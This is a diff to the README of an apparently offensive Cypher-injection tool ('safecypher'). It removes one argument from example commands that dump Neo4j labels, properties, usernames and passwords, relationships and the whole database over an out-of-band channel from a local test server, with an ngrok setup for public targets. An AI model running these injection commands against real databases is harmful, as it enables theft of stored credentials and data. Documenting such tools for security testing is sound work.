@@ -302,7 +302,7 @@ options:
 1. Dump labels
 	```
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -s "Kohaku" -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band --labels
+	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band --labels
 	
 	APOC detected, retrieving APOC version...
 	+------+----------------+
@@ -335,7 +335,7 @@ options:
 2. Dump properties in relation to label
 	```
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -s "Kohaku" -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band -L User --properties
+	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band -L User --properties
 	
 	[*] Label: User
 	[+] available properties [2]:
@@ -345,7 +345,7 @@ options:
 3. Dump values in relation to label and properties
 	```
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -s "Kohaku" -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band -L User -P username,password
+	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band -L User -P username,password
 	
 	[*] Label: User
 	[+] available properties [2]:
@@ -368,7 +368,7 @@ options:
 4. Dump relationships
 	```
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -s "Kohaku" -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band  --relationship
+	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band  --relationship
 	
 	[*] exfiltrating relationships
 	
@@ -408,7 +408,7 @@ options:
 5. Dump everything
 	```
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -s "Kohaku" -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band --dump-all
+	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i eth0 -m POST -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band --dump-all
 	```
 
 #### Utilizing Ngrok for Public Testing
@@ -421,7 +421,7 @@ options:
 2. Change the interface to 'public'
 	```
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://public_server:5000/search1 -p keyboard_name -i public -m POST -s "Kohaku" -c "<cookie>" --out-of-band --dump-all
+	└─$ python3 safecypher.py -u http://public_server:5000/search1 -p keyboard_name -i public -m POST -c "<cookie>" --out-of-band --dump-all
 	```
 
 ### In-Band (Blind Boolean)
